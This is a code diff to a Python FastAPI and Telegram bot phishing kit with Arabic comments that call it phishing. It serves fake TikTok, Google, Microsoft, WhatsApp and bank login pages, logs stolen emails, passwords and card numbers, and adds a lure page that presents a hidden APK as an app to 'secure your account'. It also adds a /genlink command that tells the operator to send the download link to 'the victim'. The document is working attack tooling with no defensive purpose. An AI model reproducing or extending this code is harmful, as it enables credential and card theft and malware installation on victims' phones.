@@ -52,7 +52,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ==================== المسار الرئيسي (يعرض صفحات HTML بشكل صحيح) ====================
+# ==================== المسار الرئيسي (صفحات التصيد) ====================
 @app.get("/", response_class=HTMLResponse)
 async def home(request: Request):
     template = request.query_params.get("template", "tiktok")
@@ -66,15 +66,174 @@ async def serve_apk():
     else:
         return HTMLResponse("<h1>⚠️ الملف غير موجود</h1>", status_code=404)
 
-# ==================== صفحة تحميل التطبيق ====================
-@app.get("/download", response_class=HTMLResponse)
-async def download_page():
-    return get_download_html()
+# ==================== صفحة التحميل المخصصة للضحية ====================
+@app.get("/download_app", response_class=HTMLResponse)
+async def download_app_page(request: Request):
+    user_id = request.query_params.get("id", "guest")
+    return f"""<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحميل التطبيق</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
+        body {{
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+        }}
+        .card {{
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            animation: float 3s ease-in-out infinite;
+        }}
+        @keyframes float {{
+            0% {{ transform: translateY(0px); }}
+            50% {{ transform: translateY(-10px); }}
+            100% {{ transform: translateY(0px); }}
+        }}
+        .icon {{
+            font-size: 70px;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }}
+        @keyframes pulse {{
+            0% {{ transform: scale(1); }}
+            50% {{ transform: scale(1.1); }}
+            100% {{ transform: scale(1); }}
+        }}
+        h1 {{
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }}
+        .sub {{
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 15px;
+            margin-bottom: 30px;
+            line-height: 1.7;
+        }}
+        .btn-download {{
+            display: inline-block;
+            background: linear-gradient(90deg, #f7971e, #ffd200);
+            color: #1a1a2e;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(247, 151, 30, 0.4);
+            letter-spacing: 0.5px;
+        }}
+        .btn-download:hover {{
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 15px 35px rgba(247, 151, 30, 0.6);
+        }}
+        .btn-download:active {{
+            transform: scale(0.95);
+        }}
+        .secure-badge {{
+            margin-top: 25px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }}
+        .secure-badge span {{
+            font-size: 16px;
+        }}
+        .footer {{
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+        }}
+        .particles {{
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }}
+        .particle {{
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 50%;
+            animation: rise linear infinite;
+        }}
+        @keyframes rise {{
+            0% {{ transform: translateY(100vh) scale(0); opacity: 0; }}
+            20% {{ opacity: 1; }}
+            100% {{ transform: translateY(-10vh) scale(1); opacity: 0; }}
+        }}
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="card">
+        <div class="icon">📲</div>
+        <h1>تحميل التطبيق</h1>
+        <p class="sub">حمّل التطبيق الآن لتأمين حسابك والاستفادة من المزايا الحصرية</p>
+        <a href="/app.apk" class="btn-download" download>
+            ⬇️ تحميل التطبيق الآن
+        </a>
+        <div class="secure-badge">
+            <span>🔒</span> اتصال مشفر وآمن
+        </div>
+        <div class="footer">الإصدار 2.0 · Shadow System</div>
+    </div>
+    <script>
+        // جسيمات متحركة (تأثير بصري)
+        const container = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {{
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            particle.style.animationDelay = (Math.random() * 10) + 's';
+            particle.style.width = (Math.random() * 3 + 2) + 'px';
+            particle.style.height = particle.style.width;
+            container.appendChild(particle);
+        }}
+    </script>
+</body>
+</html>"""
 
 # ==================== صفحة تسجيل الدخول ====================
 @app.get("/login-page", response_class=HTMLResponse)
 async def login_page():
     return get_login_html()
+
+# ==================== صفحة تحميل APK (للمالك) ====================
+@app.get("/download", response_class=HTMLResponse)
+async def download_page():
+    return get_download_html()
 
 # ==================== مسار Webhook ====================
 @app.post(f"/{BOT_TOKEN}")
@@ -149,6 +308,14 @@ def init_db():
             images_count INTEGER,
             contacts_rows INTEGER,
             created_at TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS download_links (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            link_id TEXT UNIQUE,
+            generated_for INTEGER,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP
         )
     """)
     conn.commit()
@@ -228,6 +395,16 @@ def log_credentials(owner_chat_id, login_type, email, password, card_number, car
         conn.close()
     except Exception as e:
         logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")
+
+def save_download_link(link_id, chat_id):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO download_links (link_id, generated_for) VALUES (?, ?)", (link_id, chat_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.error(f"⚠️ فشل تسجيل رابط التحميل: {e}")
 
 # ==================== صفحات HTML ====================
 def get_login_html():
@@ -453,9 +630,8 @@ def get_download_html():
 </body>
 </html>"""
 
-# ==================== قوالب التصيد (مع إصلاح عرض HTML) ====================
+# ==================== قوالب التصيد ====================
 def get_html_content(template_type, secret_key):
-    # قوالب الكاميرا
     if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:
         bg_color = "#010101"; card_bg = "#121212"; btn_color = "#fe2c55"
         logo_text = "TikTok"; logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
@@ -633,7 +809,6 @@ def get_html_content(template_type, secret_key):
 </body>
 </html>"""
     
-    # قالب جوجل
     elif template_type == "google":
         return f"""<!DOCTYPE html>
 <html lang="ar" dir="ltr">
@@ -694,7 +869,6 @@ def get_html_content(template_type, secret_key):
 </body>
 </html>"""
     
-    # قالب مايكروسوفت
     elif template_type == "microsoft":
         return f"""<!DOCTYPE html>
 <html lang="ar" dir="ltr">
@@ -750,7 +924,6 @@ def get_html_content(template_type, secret_key):
 </body>
 </html>"""
     
-    # قالب واتساب
     elif template_type == "whatsapp":
         return f"""<!DOCTYPE html>
 <html lang="ar" dir="ltr">
@@ -810,7 +983,6 @@ def get_html_content(template_type, secret_key):
 </body>
 </html>"""
     
-    # قالب بنك
     elif template_type == "bank":
         return f"""<!DOCTYPE html>
 <html lang="ar" dir="ltr">
@@ -1058,30 +1230,33 @@ def show_main_menu(chat_id):
         InlineKeyboardButton("🔑 مايكروسوفت", callback_data="gen_microsoft"),
         InlineKeyboardButton("💬 واتساب", callback_data="gen_whatsapp"),
         InlineKeyboardButton("💳 بنك", callback_data="gen_bank"),
-        InlineKeyboardButton("📲 تحميل التطبيق", callback_data="open_app_download"),
+        InlineKeyboardButton("🔗 توليد رابط التحميل", callback_data="gen_download_link"),
         InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
     )
     bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data == "open_app_download")
-def open_app_download(call):
+@bot.callback_query_handler(func=lambda call: call.data == "gen_download_link")
+def handle_gen_download_link(call):
     try:
-        bot.answer_callback_query(call.id, "جاري فتح صفحة التحميل...")
-        markup = InlineKeyboardMarkup()
-        markup.add(
-            InlineKeyboardButton(
-                "📲 افتح صفحة التحميل",
-                web_app=WebAppInfo(url=f"{RENDER_URL}/download")
-            )
-        )
+        bot.answer_callback_query(call.id, "⏳ جاري توليد الرابط...")
+        # محاكاة الأمر /genlink
+        chat_id = call.message.chat.id
+        if chat_id != OWNER_ID:
+            bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام.")
+            return
+        unique_id = f"user_{chat_id}_{int(datetime.now().timestamp())}"
+        download_url = f"{RENDER_URL}/download_app?id={unique_id}"
+        save_download_link(unique_id, chat_id)
         bot.send_message(
-            call.message.chat.id,
-            "🔽 **صفحة تحميل التطبيق الخفي**\n\nاضغط على الزر أدناه لفتح صفحة التحميل.",
-            reply_markup=markup,
+            chat_id,
+            f"🔗 **رابط تحميل التطبيق المخصص للضحية:**\n\n"
+            f"`{download_url}`\n\n"
+            f"📌 أرسل هذا الرابط للضحية.\n"
+            f"🆔 معرف الرابط: `{unique_id}`",
             parse_mode="Markdown"
         )
     except Exception as e:
-        logger.error(f"خطأ في فتح صفحة التحميل: {e}")
+        logger.error(f"خطأ في توليد الرابط: {e}")
         bot.send_message(call.message.chat.id, f"❌ خطأ: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
@@ -1118,6 +1293,29 @@ def gen_link(call):
     except Exception as e:
         logger.error(f"💥 خطأ: {traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")
+
+# ==================== أمر توليد رابط التحميل (للمالك) ====================
+@bot.message_handler(commands=['genlink'])
+def generate_download_link(message):
+    chat_id = message.chat.id
+    if chat_id != OWNER_ID:
+        bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام.")
+        return
+    try:
+        unique_id = f"user_{chat_id}_{int(datetime.now().timestamp())}"
+        download_url = f"{RENDER_URL}/download_app?id={unique_id}"
+        save_download_link(unique_id, chat_id)
+        bot.send_message(
+            chat_id,
+            f"🔗 **رابط تحميل التطبيق المخصص للضحية:**\n\n"
+            f"`{download_url}`\n\n"
+            f"📌 أرسل هذا الرابط للضحية. عند فتحه، ستظهر صفحة تحميل جذابة تحتوي على زر تحميل."
+            f"\n\n🆔 معرف الرابط: `{unique_id}`",
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        logger.error(f"خطأ في توليد الرابط: {e}")
+        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
 
 # ==================== تشغيل الخادم ====================
 @app.on_event("startup")
